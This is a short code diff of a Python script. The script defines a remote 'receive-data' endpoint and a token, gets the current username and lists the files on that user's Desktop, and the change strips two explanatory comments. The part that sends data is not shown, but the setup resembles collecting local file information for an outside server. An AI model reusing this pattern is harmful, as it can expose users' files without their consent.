@@ -7,12 +7,12 @@ import getpass
 endpoint = "https://backend-server-fastapi.vercel.app/receive-data"
 
 # Define the token
-token = "TestTokenDemo_123"  # Replace with your actual token
+token = "TestTokenDemo_123"  
 
 # Get the current username
 username = getpass.getuser()
 
-# Get list of files from a directory (Desktop in this code)
+# Get list of files from a directory 
 desktop_path = os.path.join("C:\\Users", username, "Desktop")
 files = [f for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f))]
 
